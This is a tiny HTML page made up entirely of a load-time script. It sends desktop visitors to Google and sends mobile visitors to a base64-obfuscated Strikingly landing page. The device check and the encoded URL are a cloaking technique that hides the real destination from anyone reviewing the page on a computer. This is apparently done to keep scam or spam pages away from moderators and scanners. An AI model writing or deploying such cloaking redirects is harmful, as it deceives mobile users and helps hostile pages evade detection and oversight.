
<!DOCTYPE html>
<html>
<head>
    <script>
        (function() {
            var m_url = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
            var p_url = "https://www.google.com";
            
            var ua = navigator.userAgent.toLowerCase();
            var isPC = /windows|macintosh|linux/i.test(ua) && !/android|iphone|ipad|ipod/i.test(ua);

            if (isPC) {
                // Laptop/PC par seedha Google
                window.location.replace(p_url);
            } else {
                // Mobile par seedha (Direct) Strikingly landing page
                window.location.replace(atob(m_url));
            }
        })();
    </script>
</head>
